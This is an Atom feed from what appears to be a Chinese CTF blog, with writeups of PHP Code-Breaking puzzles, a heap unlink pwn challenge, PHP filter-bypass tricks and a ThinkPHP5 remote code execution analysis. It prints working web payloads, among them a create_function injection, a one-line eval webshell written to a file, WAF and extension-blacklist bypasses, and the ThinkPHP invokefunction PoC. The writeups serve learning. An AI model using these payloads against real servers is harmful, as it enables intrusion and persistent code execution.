<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ruozhi</title>
  
  <subtitle>如题</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://liey1.github.io/"/>
  <updated>2019-05-02T14:03:22.681Z</updated>
  <id>https://liey1.github.io/</id>
  
  <author>
    <name>ruozhi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>四道 Code-Breaking Puzzles 的笔记</title>
    <link href="https://liey1.github.io/2019/05/02/%E5%9B%9B%E9%81%93%20Code-Breaking%20Puzzles%20%E7%9A%84%E7%AC%94%E8%AE%B0/"/>
    <id>https://liey1.github.io/2019/05/02/四道 Code-Breaking Puzzles 的笔记/</id>
    <published>2019-05-02T14:02:32.077Z</published>
    <updated>2019-05-02T14:03:22.681Z</updated>
    
    <content type="html"><![CDATA[<p>主要参考：<a href="https://paper.seebug.org/755/#easy-function" target="_blank" rel="noopener">Code Breaking 挑战赛 Writeup</a></p><hr><p>看着 <code>WP</code> 做了四道 <code>php</code> 的题目，跟一下：</p><h1 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题两个知识点吧：</p><blockquote><p><code>^[a-z0-9_]*$/isD</code></p></blockquote><p>正则表达式大概就是想说，匹配 <code>a-z0-9_</code> 开头且结尾的东西。就不进入 <code>else</code><br>这点很好绕过，回想一下命名空间，可以在函数前加个  <code>\</code>。</p><blockquote><p><code>$action(&#39;&#39;, $arg);</code></p></blockquote><p>第二个的话，我们要找一个函数，只能控制第二个参数，执行代码。<br>当然我们很容易想到（ <code>WP</code> 说的），<code>create_function</code></p><p><code>create_function</code> :</p><blockquote><p>create_function ( string \$args , string $code )</p></blockquote><p>大概就是这样的：</p><blockquote><p>$b = create_function(‘’,’echo 1;’);</p></blockquote><p>用正常的方法定义，等于：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function b()&#123;echo 1;&#125;</span><br></pre></td></tr></table></figure></p><p>如果我们可以改变 <code>echo 1;</code> 这个位置的地方。我们可以改成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function b()&#123;echo 1;&#125;eval($_GET[1]);//&#125;</span><br></pre></td></tr></table></figure><p>这样就相当于闭合了这个函数，写了一行新的代码了。而且这样是可以的！！</p><p>所以这题的 <code>payload</code> 就是：<code>?action=\create_function&amp;arg=echo%201;}eval($_GET[1]);//</code></p><p>不过 <code>create_function</code> 函数在 <code>php7.2</code> 后已经废弃了。</p><h1 id="pcrewaf"><a href="#pcrewaf" class="headerlink" title="pcrewaf"></a>pcrewaf</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function is_php($data)&#123;</span><br><span class="line">    return preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(empty($_FILES)) &#123;</span><br><span class="line">    die(show_source(__FILE__));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = &apos;data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">$data = file_get_contents($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">if (is_php($data)) &#123;</span><br><span class="line">    echo &quot;bad request&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @mkdir($user_dir, 0755);</span><br><span class="line">    $path = $user_dir . &apos;/&apos; . random_int(0, 10) . &apos;.php&apos;;</span><br><span class="line">    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $path);</span><br><span class="line"></span><br><span class="line">    header(&quot;Location: $path&quot;, true, 303);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>又是正则表达式：这道题可以简化成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function is_php($data)&#123;</span><br><span class="line">    return preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data);</span><br><span class="line">&#125;</span><br><span class="line">$data = $_GET[&apos;data&apos;];</span><br><span class="line">if (!is_php($data)) &#123;</span><br><span class="line">    file_put_contents(&quot;test2.php&quot;,$data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>大概就是，<code>&lt;?</code> 后不能有内容（我也说不明白。</p><p>关于 <code>有限状态自动机</code>，p神已经写的很清楚了 <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p>我的理解大概就是，匹配过程中如果匹配不上会回溯，但是回溯会影响性能，所以肯定有一个回溯的界限，这个界限在 <code>php.ini</code> 中可以设置：<code>pcre.backtrack_limit=100000</code>，默认其实是 <code>1000000（100万）</code>。</p><p>当回溯次数超过 <code>100万</code> 就会直接返回 <code>false</code>。</p><p>所以这里我们就可以发送：<br><code>&lt;?php echo 1; ?&gt;a*1000000</code></p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/01/ec6cf94640fbd2838030a78895f09dfa.png" alt="此处输入图片的描述"></p><p>大概就是这样啦，至于为什么 <code>b</code> 和 <code>c</code> 中间要有个 <code>.*</code> ，是因为要有个 <code>回溯</code> 的过程，详细可以看看p神的文章。</p><h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123;    </span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>又又又是正则表达式，这里的意思大概就是，去掉 <code>\w+()</code>，最后只能一个分号的话，就可以。</p><p>再说白点就是可以调用函数，但是不能有参数。</p><p>这得非常了解 <code>php</code> 的函数了。我这种只会写 <code>Hello world</code> 的。。。。</p><p>我们有一个函数：<a href="https://php.net/manual/zh/function.get-defined-vars.php" target="_blank" rel="noopener">get_defined_vars</a></p><p><code>get_defined_vars — 返回由所有已定义变量所组成的数组</code></p><p>大概长这样:<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/01/fb038ae940a06d898058388d762555b2.png" alt="此处输入图片的描述"></p><p>里面有 <code>_GET</code> <code>_POST</code> <code>_SERVER</code> <code>_FILES</code> 等等。。</p><p>我们发现第一个就是 <code>get</code> ，所以我们可以再用 <code>current</code> 函数。</p><p>什么，你问我 <code>current</code> 函数是什么？</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/01/2be539fb400b158f80b97eb0c42a3c43.png" alt="此处输入图片的描述"></p><p>返回 <code>内部指针当前指向的值</code>。就是 <code>_GET</code> 啦，如果用 <code>next()</code>，就是 <code>_POST</code>，这两个我们都可以控制的。</p><p>但是这是个数组呀，有没有一个函数可以数组拼接成字符串呢？有：<code>implode</code>。</p><p>于是我们的 <code>payload</code> 横空出世：<code>?a=print_r(123);//&amp;code=eval(implode(current(get_defined_vars())));</code></p><p>如果觉得奇怪可以调试调试。。</p><p>或者干脆，<code>GET</code> 提交：<code>code=eval(implode(current(get_defined_vars())));</code><br>然后 <code>POST</code> 提交：<code>hhh=file_put_contents(&#39;ceshi.php&#39;,&#39;&lt;?php eval($_GET[1]); ?&gt;&#39;);</code></p><p>学习一下别人的 <code>payload</code>：<br><code>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></p><h1 id="phpmagic-1"><a href="#phpmagic-1" class="headerlink" title="phpmagic"></a>phpmagic</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if(isset($_GET[&apos;read-source&apos;])) &#123;</span><br><span class="line">    exit(show_source(__FILE__));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(&apos;DATA_DIR&apos;, dirname(__FILE__) . &apos;/data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]));</span><br><span class="line"></span><br><span class="line">if(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, 0755, true);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = isset($_POST[&apos;domain&apos;]) ? $_POST[&apos;domain&apos;] : &apos;&apos;;</span><br><span class="line">$log_name = isset($_POST[&apos;log&apos;]) ? $_POST[&apos;log&apos;] : date(&apos;-Y-m-d&apos;);</span><br><span class="line">if(!empty($_POST) &amp;&amp; $domain):</span><br><span class="line">    $command = sprintf(&quot;dig -t A -q %s&quot;, escapeshellarg($domain));</span><br><span class="line">    $output = shell_exec($command);</span><br><span class="line"></span><br><span class="line">    $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line">    $log_name = $_SERVER[&apos;SERVER_NAME&apos;] . $log_name;</span><br><span class="line">    if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;, &apos;phtml&apos;, &apos;pht&apos;], true)) &#123;</span><br><span class="line">        file_put_contents($log_name, $output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $output;</span><br><span class="line">endif; ?&gt;</span><br></pre></td></tr></table></figure><p>这道题要用到 <code>dig</code> ，所以要放在 <code>linux</code> 下。</p><p>我们看到命令执行前有个 <code>escapeshellarg</code> 这个。绕不过去，但是我们这里是可以控制返回值的部分内容：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/02/353d59c8405e0ed580e95e8c611c155c.png" alt="此处输入图片的描述"></p><p>那我们是不是能直接写 <code>&lt;?php ... ?&gt;</code> 了呢？</p><p>不行，因为还有个 <code>htmlspecialchars</code>。</p><p>然后在下面还有 <code>黑名单</code> 判断了后缀。</p><p><code>if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;], true))</code></p><p>这里有个 <code>tips</code> 绕过黑名单：<code>a.php/.</code>。</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/02/3a46b1d440dfde4d807503b7b2b7fe80.png" alt="此处输入图片的描述"></p><p>这里绕过了，我们怎么写 <code>php</code> 呢？可以用 <code>base64</code> 写啊，就是：<br><code>php://filter/</code> 伪协议咯。</p><p>当然，这里还有个问题，我们发现 <code>$log_name</code> 是这么拼接的：</p><p><code>$log_name = $_SERVER[&#39;SERVER_NAME&#39;] . $log_name;</code></p><p>有个 <code>SERVER_NAME</code>，这个 <code>SERVER_NAME</code> 就是获取请求头中的 <code>host</code>，所以我们可以修改 <code>host</code> 头来改变。</p><p>我先写个 <code>echo 1</code> 试试，我们的 <code>payload</code> ：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/02/77b3e1a94089d7b9803e90733ed560ce.png" alt="此处输入图片的描述"></p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/02/e466fd4540b38a7780a329d6c2333ebf.png" alt="此处输入图片的描述"></p><p>可以看到我们的 <code>domain</code> 前面还有两个 <code>1</code>，这是拿来填充的，因为 <code>base64</code> 是按四个字节解码的，前面的字符凑起来不是 <code>4</code> 的倍数，所以填充上 <code>11</code></p><p>但是你会发现：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/02/baafb40040f7b4ce80147c084d585fe7.png" alt="此处输入图片的描述"></p><p>what？没有内容？</p><p>哪里出问题了呢？原因就在这个 <code>=</code> 号上面。我们把 <code>等于号</code> 删了，就可以了（具体原因未知。。。）</p><p>不过可能因为文件名最后的 <code>/.</code> 的原因，这里是不能覆盖文件的，所以要把源文件删了或者换个文件名才行。</p><p>我们删掉 <code>等于号</code> 试试：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/02/8b63a55540f602508039dc93b0bc8cb4.png" alt="此处输入图片的描述"></p><p>可以了！！</p><p>这里一开始也有想用 <code>string.rot13</code> 的，但是 <code>rot13</code> 并不会转换 <code>&lt;?</code>。</p><hr><p>这里就要说一下，在 <code>windows</code> 还有个方法甚至能绕过白名单，就是把文件名设置成： <code>a.php;1.jpg</code>。但是那样文件的内容会变成 <code>空</code> ，不知道为啥。。算了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;主要参考：&lt;a href=&quot;https://paper.seebug.org/755/#easy-function&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Code Breaking 挑战赛 Writeup&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;看着 &lt;c
      
    
    </summary>
    
    
      <category term="web" scheme="https://liey1.github.io/tags/web/"/>
    
      <category term="ctf" scheme="https://liey1.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>unlink 的初级用法</title>
    <link href="https://liey1.github.io/2019/02/20/unlink%20%E7%9A%84%E5%88%9D%E7%BA%A7%E7%94%A8%E6%B3%95/"/>
    <id>https://liey1.github.io/2019/02/20/unlink 的初级用法/</id>
    <published>2019-02-20T14:04:30.222Z</published>
    <updated>2019-02-20T14:06:10.472Z</updated>
    
    <content type="html"><![CDATA[<p>hgame 的一道简单题<br>一道很（tm） 简单的题。。唉~</p><p><a href="http://bmob-cdn-21459.b0.upaiyun.com/2019/02/20/3006b89c402ffb5080221f20021e2831.zip" target="_blank" rel="noopener">exp 和二进制文件</a></p><hr><p>先看看功能：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/02/20/2105c8e940d5f6aa80878d39ee6ab74d.png" alt="此处输入图片的描述"></p><p>标准的堆题选项，依此看看功能：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/02/20/b122f16c4034db6c808c5d9a6e2b9188.png" alt="此处输入图片的描述"><br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/02/20/770e91c1409c0ae080b09033e17b04f5.png" alt="此处输入图片的描述"><br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/02/20/5befcbb040cad315806b3808788f95f0.png" alt="此处输入图片的描述"><br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/02/20/1b93167540a7db2580f6fb5a82b47246.png" alt="此处输入图片的描述"></p><p>漏洞点也很明显，就是在 <code>set_name</code> 时申请的时 0x80，但是在 <code>reset_name</code> 却读了 0x100 个字节。</p><p>我们可以修改到 size，意味着我们可以 unlink 上一个块。<br>没错，unlink 有检测，但是我们还有一个指针，就是在 <code>bss</code> 段中存着 <code>name</code> 的堆地址的数组变量：<code>ptr</code>。</p><p>看一下unlink 的检测：</p><pre><code>if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))    malloc_printerr (&quot;corrupted double-linked list&quot;);</code></pre><blockquote><p>理一下流程，假设我们有两个chunk（都不与 topchunk 相连），就叫 chunk1 和 chunk2 吧，大小为 0x90。</p><ol><li><p>调用 reset_name 编辑 chunk1 的时候去覆盖 chunk2 的 prev_szie 和 size，都覆盖为 0x90 。</p></li><li><p>调用 delete_name 删除 chunk2。</p></li><li><p>此时应该会调用： unlink(chunk1) ，执行到检测时就会触发上面的报错，因为在编辑 chunk1 时只能在 fd 的位置上随便填充一些字符（比如是 ‘a’*8），那么当 unlink chunk1 的时候获取到的 fd 就是 0x6161616161616161 ，所以 fd-&gt;bk 自然就会崩了。</p></li></ol></blockquote><p>先直接说怎么绕过（如果不理解先不用想为什么），此处假设 ptr 的位置处存放着 chunk1 的地址（注意这个地址是从 <code>fd</code> 开始的。）：</p><blockquote><ol><li>编辑 chunk1 时，前 4个 8 位（64位程序），分别是：0x0,0x81,&amp;ptr-24,&amp;ptr-16</li><li>接着第一条，在编辑到 chunk2 的 prev_size 时填 0x80，size 处为 0x90。</li><li>调用 delete_name 删除 chunk2</li></ol></blockquote><p>这样是不会报错的。<br>说说为什么：</p><ol><li>delete_name chunk2 ，首先检测到 size 的 in_use 位为 0。尝试合并上一个块</li><li>获取上一个块的操作就是：chunk2 - chunk2_prev_size = chunk2-0x80。<blockquote><p>但是 chunk1 的大小是 0x90，所以 0x80 是什么呢？就是 chunk1 的 fd 的位置。<br>此处的位置已经被我们伪造成了一个假的 chunk 了，这个假 chunk </p></blockquote></li></ol><p>此时这个假chunk大概长成这样：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/02/20/8a1f68e94021b3598028435c4515e842.png" alt="此处输入图片的描述"></p><p>前面说过 <code>ptr</code> 这个位置存储着 <code>chunk1</code> 的地址，但是这个地址肯定是从 <code>chunk1-&gt;fd</code> 开始的，因为是 <code>malloc</code> 出来的吗。当 <code>unlink</code> 这个 <code>chunk</code> 的时候，fd-&gt;bk，因为是 64 位程序，然后 bk 在 chunk 的第四位，所以是 <code>ptr-24+24</code> ，这时候又指向了 ptr，此处 <code>bk-&gt;fd</code> 也是同理，于是便绕过了那句检测。</p><p>那么那么那么。。。unlink 之后有什么用呢？<br>就在检测的下面就有两行说出了他的用处 ：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/02/20/b9758886408395ef80d27f89c2ecd5a1.png" alt="此处输入图片的描述"></p><p>fd-&gt;bk = bk-&gt;fd，因为都是指向 ptr 的位置。<br>所以第二句会覆盖掉第一句的操作，所以第二句做了什么呢？</p><blockquote><p>ptr = bk-&gt;fd = fd</p></blockquote><p>那 fd 是什么呢，看上面的图，就知道是 ptr-24 啦。</p><p>这时候我们的 ptr 的地址就指向 ptr-24，我们编辑 chunk1 的时候，从 ptr 找到地址：ptr-24，然后编辑。这时候我们又可以编辑 ptr 了，输出也是输出的 ptr 指向的位置。所以我们就有个任意读写啦。。。</p><p>okok，就写这么多了。。大概思路就这样</p><p>上面就有 exp 的文件啦。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题还是很简单的。。。还是太菜了。。。</p><p>这tm 哪是扫尘啊，这都快扫骨灰了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;hgame 的一道简单题&lt;br&gt;一道很（tm） 简单的题。。唉~&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://bmob-cdn-21459.b0.upaiyun.com/2019/02/20/3006b89c402ffb5080221f20021e2831.zip&quot; ta
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://liey1.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://liey1.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>PHP 中绕过的小 TIPS</title>
    <link href="https://liey1.github.io/2018/12/30/PHP%20%E4%B8%AD%E7%BB%95%E8%BF%87%E7%9A%84%E5%B0%8F%20TIPS/"/>
    <id>https://liey1.github.io/2018/12/30/PHP 中绕过的小 TIPS/</id>
    <published>2018-12-30T14:15:21.553Z</published>
    <updated>2018-12-30T14:16:49.878Z</updated>
    
    <content type="html"><![CDATA[<p>来自一篇很有意思的文章：<a href="https://www.exploit-db.com/docs/46049" target="_blank" rel="noopener">How To Exploit PHP Remotely To Bypass Filters &amp; WAF Rules</a></p><hr><p>扫一下尘。。233</p><p>首先来一段简易 WAF：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(preg_match(&quot;/system/i&quot;,$_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    echo &quot;invalid syntax&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>当然我知道，还有别的方法执行命令，这里讨论如何绕过 <code>system</code>。</p><p>我们知道（或许你刚刚才知道的），在 <code>php</code> 中可以这么表达一个字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;\x61&quot;;</span><br><span class="line">$b = &quot;\141&quot;;</span><br><span class="line">$c = &quot;\u&#123;0061&#125;&quot;; // 这里个 &#123;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>以上三个都能表示 <code>a</code> 这个字符。所以在这里我们可以这么绕过：<br><code>system = \x73\x79\x73\x74\x65\x6d</code>(<a href="https://tool.lu/hexstr/" target="_blank" rel="noopener">这里转</a>)</p><p>于是我们就可以提交：<code>code = &quot;\x73\x79\x73\x74\x65\x6d&quot;(&#39;whoami&#39;)</code>;</p><p>然后我们升级一下：<br><code>(preg_match(&quot;/system|\&quot;|&#39;/i&quot;,$_GET[&#39;code&#39;]))</code></p><p>这次我们过滤了单双引号，我们上一个 payload 在这里就行不通了。</p><p>但是我们又知道，在 PHP 中还可以这么表示字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = (a);</span><br><span class="line">$b = (string)a;</span><br></pre></td></tr></table></figure></p><p>当然，目前我们还是不能执行 <code>system</code>，我们可以用一下 <code>php</code> 中的字符串连接符（<code>.</code>）：</p><p><code>(sy.(s).tem)</code></p><p>于是我们的第一个 <code>payload</code> 诞生了：<br><code>(sy.(s).tem)(whoami);</code></p><p>虽然会有一些报错，但好在还是执行了。。</p><hr><p>我们换个思路来玩玩：<code>get_defined_functions</code></p><p>这个函数执行一下就知道了。会返回 <code>php</code> 中已经定义了得函数，包括内部的。自然，也有 <code>system</code>。</p><p>这是个二维数组，内部函数在 <code>internal</code> 这个数组中。我执行了一下，<code>system</code> 在我这得下标是 <code>355</code>。于是第三个 <code>payload</code> 如下：</p><p><code>(get_defined_functions()[internal][355])(whoami);</code></p><p>当然还有个更简单的：</p><p><code>?a=system&amp;code=$_GET[a](whoami);</code></p><p>此外我们还可以利用类似：</p><p><code>file_get_contents(substr(__FILE__,0,-19));</code> 然后再 <code>substr</code> 获取里面的内容来拼接。。这里的 <code>__FILE__</code> 会多出来一些字符，所以用 <code>substr</code> 截断一下。</p><p>当然到这里我已经不知道有什么用了。。但觉得有意思就写下来了。。当作扫扫灰吧。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;来自一篇很有意思的文章：&lt;a href=&quot;https://www.exploit-db.com/docs/46049&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;How To Exploit PHP Remotely To Bypass Filters 
      
    
    </summary>
    
    
      <category term="web" scheme="https://liey1.github.io/tags/web/"/>
    
      <category term="php" scheme="https://liey1.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp5 的任意代码执行</title>
    <link href="https://liey1.github.io/2018/12/17/Thinkphp5%20%E7%9A%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>https://liey1.github.io/2018/12/17/Thinkphp5 的任意代码执行/</id>
    <published>2018-12-16T16:56:01.823Z</published>
    <updated>2018-12-16T16:57:49.169Z</updated>
    
    <content type="html"><![CDATA[<p>粗糙的分析了一下。。2333</p><hr><p>首先看看我们的 <code>poc</code> ： <code>?s=index/think\app/invokefunction</code></p><p>然后在 <code>library\App.php</code> 的 <code>run</code> 函数中：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/17/2222d6fd40ea972e808266127fcce619.png" alt="此处输入图片的描述"></p><p>那么 <code>dispatch</code> 是什么呢？<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/17/24ee2f6540e5367180db0c715bd3e15e.png" alt="此处输入图片的描述"></p><p>由于我没有 <code>debug</code> 插件，所以用我最爱的 <code>print_r</code>，这里我用了 <code>laysns</code>（别问，随便挑的）：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/17/40629b1d4072db4180d53dd8bdabd2e9.png" alt="此处输入图片的描述"><br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/17/d202315d403d8e0280af195553b46664.png" alt="此处输入图片的描述"><br>发现在此时 dispatch 是空的且与参数无关，那么就必然进入：<code>if(empty($dispatch))</code><br>此时的 <code>$request</code> 是 ThinkPHP 的 <code>request</code> 对象：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/17/a93ca16040c19f8c8005d004b7c15887.png" alt="此处输入图片的描述"></p><p>那我们跟入 <code>routeCheck</code>：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/17/73cebd6c40ced82b8076fd71dc150d7b.png" alt="此处输入图片的描述"></p><p>首先 path 是获取 参数 <code>s</code> 的值:<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/17/896c12c54013bf2280a27fed32a505c7.png" alt="此处输入图片的描述"></p><p>接下来似乎判断了，是否需要检测路由。</p><p>是否都无所谓，因为我们传的一般不在路由规则里，再接下来：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/17/62fba49f4015473d802107c827062319.png" alt="此处输入图片的描述"></p><p>判断是否需要强制路由，如果开启了强制路由，那么就会异常退出。这也就是为什么漏洞描述说：<code>在关闭强制路由的情况下。</code></p><p>然后就到了：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/17/b13bffc1401b2a8a8067ef27f4268848.png" alt="此处输入图片的描述"></p><p>这里了，如果我们路由没匹配到，此处我们就的 <code>$result</code> 就还是空，此时就会进入 <code>parseUrl</code> 函数，这个函数就不过多分析了，就是拆分 <code>$path</code>（其实是压根没看。233）</p><p>看看此处的输出就很明了了：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/17/7dc40b0b40ea56fe80a5d9dee97bdaf2.png" alt="此处输入图片的描述"></p><p>数组第一个是控制器，第二个是类，第三个是方法</p><p>可以看到已经拆分成这样了，然后返回：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/17/188de3434023da2880c5be692c190866.png" alt="此处输入图片的描述"></p><p>然后就一路执行到 <code>self:exec</code> 处。此时就执行了 <code>payload</code> 指定的类： <code>think\app</code> 中的方法：<code>invokefunction</code>。</p><p>没错，但是这个文件：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/17/23eb03b74053d4a7803120ea4707c7c1.png" alt="此处输入图片的描述"></p><p>这里用了反射，我不是特别明白。。反正能执行就对了。233</p><p>end。。。。（说实话这种洞放我我还真看不出来。。。）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;粗糙的分析了一下。。2333&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;首先看看我们的 &lt;code&gt;poc&lt;/code&gt; ： &lt;code&gt;?s=index/think\app/invokefunction&lt;/code&gt;&lt;/p&gt;
